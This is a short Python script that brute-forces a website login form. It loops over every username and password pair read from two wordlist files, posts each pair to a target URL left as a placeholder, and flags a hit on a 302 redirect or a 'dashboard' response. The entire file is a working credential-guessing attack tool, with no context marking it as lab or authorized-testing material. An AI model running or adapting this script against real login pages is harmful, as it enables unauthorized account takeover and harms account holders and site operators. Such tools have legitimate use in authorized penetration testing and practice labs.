import requests

url = "Enter Website_here...."

headers = {
#put headers
}

cookies = {
#cookies
}

with open("username.txt", "r") as userfile, open("password.txt", "r") as passfile:
    usernames = userfile.read().splitlines()
    passwords = passfile.read().splitlines()

    for username in usernames:
        for password in passwords:
            data = {
                "username": username,
                "password": password,
                "login": ""
            }

            response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

            print(f"[*] Trying: {username}:{password} | Status: {response.status_code}")

            if response.status_code == 302 or "dashboard" in response.text.lower():
                print(f"[+] FOUND => USER: {username} | PASS: {password}")
                exit()
